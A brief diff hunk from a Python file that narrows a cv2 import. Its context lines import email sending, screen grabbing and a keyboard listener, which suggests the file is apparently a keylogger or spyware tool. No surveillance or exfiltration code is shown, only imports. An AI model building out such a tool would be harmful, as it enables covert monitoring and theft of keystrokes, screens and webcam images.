@@ -15,6 +15,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from time import sleep
 
-import cv2
+from cv2 import VideoCapture, imwrite
 from PIL import ImageGrab
 from pynput.keyboard import Listener
